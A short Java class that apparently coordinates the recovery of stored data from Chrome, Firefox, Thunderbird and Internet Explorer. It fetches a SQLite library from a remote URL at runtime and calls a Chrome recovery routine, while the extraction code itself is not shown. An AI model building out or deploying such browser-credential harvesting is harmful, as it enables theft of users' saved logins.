package com.elementiumdev.recovery;

import com.elementiumdev.util.Constants;
import com.elementiumdev.util.Loader;

public class RecoveryManager {
	public static String[][] recover() {
		
		/*
		 * Sum 0 = chrome
		 * sum 1 = firefox
		 * sum 2 = thunderbird
		 * sum 3 = internet explorer
		 */
		
		String[][] sum = new String[4][];
		
		Loader.dlLoad(Constants.SQLITE_LIB_URL);
		sum[0] = new ChromeRecovery().execute();
		
		return sum;
	}
	
	public static void dump(String s) {
		
	}
}
